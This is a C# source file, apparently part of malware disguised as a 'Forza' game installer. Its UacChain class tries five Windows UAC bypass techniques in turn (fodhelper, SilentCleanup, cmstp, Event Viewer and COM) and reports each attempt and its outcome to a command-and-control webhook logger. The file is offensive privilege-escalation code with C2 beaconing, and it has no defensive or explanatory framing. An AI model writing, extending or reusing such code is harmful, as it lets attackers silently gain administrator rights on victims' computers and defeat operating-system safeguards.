namespace ForzaInstallation.Uac
{
    internal static class UacChain
    {
        internal static bool TryAll()
        {
            C2.WebhookLogger.Send("uac-fodhelper", "ATTEMPT", "");
            if (Fodhelper.Execute()) { C2.WebhookLogger.Send("uac-fodhelper", "PASS", ""); return true; }

            C2.WebhookLogger.Send("uac-fodhelper", "FAIL", "");
            C2.WebhookLogger.Send("uac-silentcleanup", "ATTEMPT", "");
            if (SilentCleanup.Execute()) { C2.WebhookLogger.Send("uac-silentcleanup", "PASS", ""); return true; }

            C2.WebhookLogger.Send("uac-silentcleanup", "FAIL", "");
            C2.WebhookLogger.Send("uac-cmstp", "ATTEMPT", "");
            if (Cmstp.Execute()) { C2.WebhookLogger.Send("uac-cmstp", "PASS", ""); return true; }

            C2.WebhookLogger.Send("uac-cmstp", "FAIL", "");
            C2.WebhookLogger.Send("uac-eventviewer", "ATTEMPT", "");
            if (EventViewer.Execute()) { C2.WebhookLogger.Send("uac-eventviewer", "PASS", ""); return true; }

            C2.WebhookLogger.Send("uac-eventviewer", "FAIL", "");
            C2.WebhookLogger.Send("uac-com", "ATTEMPT", "");
            if (ComBypass.Execute()) { C2.WebhookLogger.Send("uac-com", "PASS", ""); return true; }

            C2.WebhookLogger.Send("uac-com", "FAIL", "");
            return false;
        }
    }
}
